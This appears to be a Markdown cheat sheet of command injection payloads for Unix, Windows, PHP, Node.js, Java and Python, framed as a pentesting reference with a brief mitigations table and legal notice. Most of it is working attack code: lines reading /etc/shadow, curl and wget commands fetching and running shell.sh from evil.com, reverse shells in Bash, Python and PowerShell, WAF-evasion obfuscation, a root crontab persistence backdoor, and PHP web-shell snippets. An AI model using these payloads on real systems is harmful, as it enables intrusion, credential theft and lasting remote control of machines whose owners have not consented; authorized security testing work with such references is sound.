```markdown
# Ultimate Command Injection Payload Cheat Sheet

Command injection allows attackers to execute arbitrary OS commands on a vulnerable system. This comprehensive guide covers all scenarios from basic to advanced, including language-specific exploitation.

---

## Table of Contents
1. [Basic Command Injection](#basic-command-injection)
2. [Advanced Payloads](#advanced-payloads)
3. [Language-Specific Exploitation](#language-specific-exploitation)
   - [PHP](#php-based-command-injection)
   - [Node.js](#nodejs-javascript-command-injection)
   - [Java](#java-processbuilderruntimeexec)
   - [Python](#python-command-injection)
4. [Reverse Shells](#reverse-shell-payloads)
5. [WAF Bypass Techniques](#waf-bypass-tricks)
6. [Post-Exploitation](#post-exploitation)
7. [Defensive Mitigations](#defensive-mitigations)

---

## Basic Command Injection
### Unix/Linux
```bash
; whoami              # Simple command execution
| id                  # Pipe operator
|| ls -la /           # OR operator (executes if first fails)
&& cat /etc/passwd    # AND operator (executes if first succeeds)
`uname -a`            # Backticks execution
$(ls /home)           # Command substitution
```

### Windows
```cmd
& whoami               # Ampersand (parallel execution)
| dir C:\              # Pipe operator
|| ipconfig /all       # OR operator
&& net users           # AND operator
```

---

## Advanced Payloads
### Chaining Commands
```bash
; cat /etc/passwd; ls /tmp
| tail -n 5 /etc/shadow | grep root
&& wget http://evil.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh
```

### Blind Command Injection
```bash
; sleep 5             # Time-based detection
|| ping -c 10 127.0.0.1
$(ping -n 5 localhost) # Windows
```

### File Operations
```bash
; cat /etc/passwd
| head /etc/shadow
> /var/www/html/test.txt  # Write output to file
```

---

## Language-Specific Exploitation
### PHP-Based Command Injection
```php
<?php
system($_GET['cmd']);         // Most dangerous
exec($_POST['command']);
`$_REQUEST['cmd']`;           // Backtick operator
?>
```

**Bypass Techniques:**
```bash
?cmd=whoami'
?cmd=$(whoami)
?cmd=whoami%00              # Null byte (PHP < 8.0)
```

### Node.js (JavaScript)
**Vulnerable Code:**
```javascript
const { exec } = require('child_process');
exec('ls ' + userInput);     // Dangerous!
```

**Payloads:**
```bash
userInput=/tmp; cat /etc/passwd
userInput=' || curl http://evil.com/shell.sh | bash'
```

### Java (ProcessBuilder/Runtime.exec)
**Exploitation:**
```bash
userInput=127.0.0.1 & whoami  # Windows
userInput=sh -c $@|sh . echo whoami  # Linux bypass
```

### Python
**Vulnerable Patterns:**
```python
os.system(f"ping {user_input}")  # Risky
subprocess.run(user_input, shell=True)  # Dangerous
```

**Payloads:**
```bash
user_input=8.8.8.8; whoami
user_input='\x77\x68\x6f\x61\x6d\x69'  # Hex encoded
```

---

## Reverse Shell Payloads
### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Python
```python
python -c 'import socket,os,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## WAF Bypass Tricks
### Obfuscation Methods
```bash
# Character Escape
w'h'o'a'm'i
w"h"o"a"m"i

# Encoding
$(echo "d2hvYW1p" | base64 -d)

# Wildcards
/???/??t /???/??ss??
```

### Space Bypass
```bash
{cat,/etc/passwd}       # No spaces
IFS=,;cat$IFS/etc/passwd  # Internal Field Separator
```

---

## Post-Exploitation
### Privilege Escalation
```bash
sudo -l                 # Check sudo permissions
find / -perm -4000      # Find SUID binaries
```

### Persistence
```bash
echo "* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /etc/crontab
```

---

## Defensive Mitigations
| Technique          | Implementation Example                  |
|--------------------|----------------------------------------|
| Input Validation   | Whitelist allowed characters           |
| Secure Functions   | Use `subprocess.run([args], shell=False)` in Python |
| Least Privilege    | Run apps as non-root user              |
| WAF Rules         | Block `;`, `|`, `&`, `$()` patterns    |

---

⚠️ **Legal Notice**:  
- For **authorized penetration testing** only  
- Unauthorized testing is **illegal** under CFAA, CMA, and other laws  

```

### How to Use This File
1. Save as `ultimate_command_injection.md`
2. Use for:
   - Security assessments
   - Secure code reviews
   - Red team engagements
